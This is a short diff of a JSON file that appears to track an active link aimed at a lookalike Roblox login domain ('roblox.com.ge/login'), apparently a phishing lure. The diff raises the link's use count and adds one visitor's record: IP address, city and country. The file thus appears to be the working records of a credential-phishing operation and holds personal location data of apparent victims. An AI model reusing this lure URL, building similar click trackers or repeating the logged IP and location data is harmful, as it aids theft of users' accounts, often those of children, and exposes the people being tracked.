@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1247,
+    "useCount": 1248,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10120,6 +10120,14 @@
         "city": "La Guaira",
         "flag": "🇻🇪",
         "countryCode": "VE"
+      },
+      {
+        "timestamp": 1777342714731,
+        "ip": "186.158.26.1",
+        "country": "Argentina",
+        "city": "Castelar",
+        "flag": "🇦🇷",
+        "countryCode": "AR"
       }
     ]
   },
